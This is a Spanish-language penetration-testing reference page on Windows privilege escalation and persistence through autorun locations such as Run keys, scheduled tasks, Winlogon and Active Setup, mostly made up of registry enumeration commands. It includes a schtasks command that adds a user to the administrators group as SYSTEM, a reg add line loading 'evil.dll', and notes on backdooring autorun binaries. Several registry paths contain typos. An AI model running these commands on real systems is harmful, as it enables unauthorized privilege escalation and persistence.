# Escalación de Privilegios con Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** se puede usar para ejecutar programas en **inicio**. Vea qué binarios están programados para ejecutarse al inicio con:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Tareas Programadas

**Las tareas** se pueden programar para ejecutarse con **cierta frecuencia**. Vea qué binarios están programados para ejecutarse con:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Carpetas

Todos los binarios ubicados en las **carpetas de inicio se ejecutarán al iniciar**. Las carpetas de inicio comunes son las que se enumeran a continuación, pero la carpeta de inicio se indica en el registro. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registro

> [!NOTE]
> [Nota de aquí](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): La entrada de registro **Wow6432Node** indica que estás ejecutando una versión de Windows de 64 bits. El sistema operativo utiliza esta clave para mostrar una vista separada de HKEY_LOCAL_MACHINE\SOFTWARE para aplicaciones de 32 bits que se ejecutan en versiones de Windows de 64 bits.

### Ejecuciones

**Conocido comúnmente** registro AutoRun:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Las claves de registro conocidas como **Run** y **RunOnce** están diseñadas para ejecutar automáticamente programas cada vez que un usuario inicia sesión en el sistema. La línea de comando asignada como valor de datos de una clave está limitada a 260 caracteres o menos.

**Ejecuciones de servicio** (pueden controlar el inicio automático de servicios durante el arranque):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

En Windows Vista y versiones posteriores, las claves de registro **Run** y **RunOnce** no se generan automáticamente. Las entradas en estas claves pueden iniciar programas directamente o especificarlos como dependencias. Por ejemplo, para cargar un archivo DLL al iniciar sesión, se podría usar la clave de registro **RunOnceEx** junto con una clave "Depend". Esto se demuestra al agregar una entrada de registro para ejecutar "C:\temp\evil.dll" durante el arranque del sistema:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!NOTE]
> **Explotación 1**: Si puedes escribir dentro de cualquiera de los registros mencionados en **HKLM**, puedes escalar privilegios cuando un usuario diferente inicia sesión.

> [!NOTE]
> **Explotación 2**: Si puedes sobrescribir cualquiera de los binarios indicados en cualquiera de los registros dentro de **HKLM**, puedes modificar ese binario con una puerta trasera cuando un usuario diferente inicia sesión y escalar privilegios.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Ruta de Inicio

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Los accesos directos colocados en la carpeta **Inicio** activarán automáticamente servicios o aplicaciones para que se inicien durante el inicio de sesión del usuario o el reinicio del sistema. La ubicación de la carpeta **Inicio** está definida en el registro tanto para el ámbito de **Máquina Local** como para el de **Usuario Actual**. Esto significa que cualquier acceso directo agregado a estas ubicaciones de **Inicio** asegurará que el servicio o programa vinculado se inicie después del proceso de inicio de sesión o reinicio, lo que lo convierte en un método sencillo para programar la ejecución automática de programas.

> [!NOTE]
> Si puedes sobrescribir cualquier \[User] Shell Folder bajo **HKLM**, podrás apuntarlo a una carpeta controlada por ti y colocar una puerta trasera que se ejecutará cada vez que un usuario inicie sesión en el sistema, escalando privilegios.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Claves de Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Típicamente, la clave **Userinit** está configurada en **userinit.exe**. Sin embargo, si esta clave se modifica, el ejecutable especificado también será lanzado por **Winlogon** al iniciar sesión el usuario. De manera similar, la clave **Shell** está destinada a apuntar a **explorer.exe**, que es el shell predeterminado para Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!NOTE]
> Si puedes sobrescribir el valor del registro o el binario, podrás escalar privilegios.

### Configuraciones de Política

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Verifica la clave **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Cambiando el Símbolo del Sistema en Modo Seguro

En el Registro de Windows bajo `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, hay un valor **`AlternateShell`** configurado por defecto a `cmd.exe`. Esto significa que cuando eliges "Modo Seguro con Símbolo del Sistema" durante el inicio (presionando F8), se utiliza `cmd.exe`. Pero, es posible configurar tu computadora para que inicie automáticamente en este modo sin necesidad de presionar F8 y seleccionarlo manualmente.

Pasos para crear una opción de arranque para iniciar automáticamente en "Modo Seguro con Símbolo del Sistema":

1. Cambia los atributos del archivo `boot.ini` para eliminar las marcas de solo lectura, sistema y oculto: `attrib c:\boot.ini -r -s -h`
2. Abre `boot.ini` para editar.
3. Inserta una línea como: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Guarda los cambios en `boot.ini`.
5. Vuelve a aplicar los atributos originales del archivo: `attrib c:\boot.ini +r +s +h`

- **Explotación 1:** Cambiar la clave del registro **AlternateShell** permite la configuración de un shell de comandos personalizado, potencialmente para acceso no autorizado.
- **Explotación 2 (Permisos de Escritura en PATH):** Tener permisos de escritura en cualquier parte de la variable **PATH** del sistema, especialmente antes de `C:\Windows\system32`, te permite ejecutar un `cmd.exe` personalizado, que podría ser una puerta trasera si el sistema se inicia en Modo Seguro.
- **Explotación 3 (Permisos de Escritura en PATH y boot.ini):** El acceso de escritura a `boot.ini` permite el inicio automático en Modo Seguro, facilitando el acceso no autorizado en el próximo reinicio.

Para verificar la configuración actual de **AlternateShell**, utiliza estos comandos:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Componente Instalado

Active Setup es una característica en Windows que **se inicia antes de que el entorno de escritorio esté completamente cargado**. Prioriza la ejecución de ciertos comandos, que deben completarse antes de que el inicio de sesión del usuario continúe. Este proceso ocurre incluso antes de que se activen otras entradas de inicio, como las que se encuentran en las secciones del registro Run o RunOnce.

Active Setup se gestiona a través de las siguientes claves del registro:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Dentro de estas claves, existen varias subclaves, cada una correspondiente a un componente específico. Los valores clave de particular interés incluyen:

- **IsInstalled:**
- `0` indica que el comando del componente no se ejecutará.
- `1` significa que el comando se ejecutará una vez por cada usuario, que es el comportamiento predeterminado si falta el valor `IsInstalled`.
- **StubPath:** Define el comando que será ejecutado por Active Setup. Puede ser cualquier línea de comando válida, como lanzar `notepad`.

**Perspectivas de Seguridad:**

- Modificar o escribir en una clave donde **`IsInstalled`** esté configurado en `"1"` con un **`StubPath`** específico puede llevar a la ejecución no autorizada de comandos, potencialmente para la escalada de privilegios.
- Alterar el archivo binario referenciado en cualquier valor de **`StubPath`** también podría lograr la escalada de privilegios, dado que se tengan los permisos suficientes.

Para inspeccionar las configuraciones de **`StubPath`** a través de los componentes de Active Setup, se pueden usar estos comandos:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Objetos Ayudantes del Navegador

### Descripción General de los Objetos Ayudantes del Navegador (BHO)

Los Objetos Ayudantes del Navegador (BHO) son módulos DLL que añaden características adicionales al Internet Explorer de Microsoft. Se cargan en Internet Explorer y Windows Explorer en cada inicio. Sin embargo, su ejecución puede ser bloqueada configurando la clave **NoExplorer** a 1, impidiendo que se carguen con las instancias de Windows Explorer.

Los BHO son compatibles con Windows 10 a través de Internet Explorer 11, pero no son compatibles con Microsoft Edge, el navegador predeterminado en versiones más recientes de Windows.

Para explorar los BHO registrados en un sistema, puedes inspeccionar las siguientes claves del registro:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Cada BHO está representado por su **CLSID** en el registro, que sirve como un identificador único. La información detallada sobre cada CLSID se puede encontrar en `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Para consultar los BHO en el registro, se pueden utilizar estos comandos:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Extensiones de Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Tenga en cuenta que el registro contendrá 1 nuevo registro por cada dll y estará representado por el **CLSID**. Puede encontrar la información del CLSID en `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Controladores de Fuentes

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Comando Abrir

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opciones de Ejecución de Archivos de Imagen
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Tenga en cuenta que todos los sitios donde puede encontrar autoruns ya han sido **buscados por** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Sin embargo, para una **lista más completa de archivos autoejecutados**, puede usar [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) de Sysinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Más

**Encuentra más Autoruns como registros en** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Referencias

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)



{{#include ../../banners/hacktricks-training.md}}
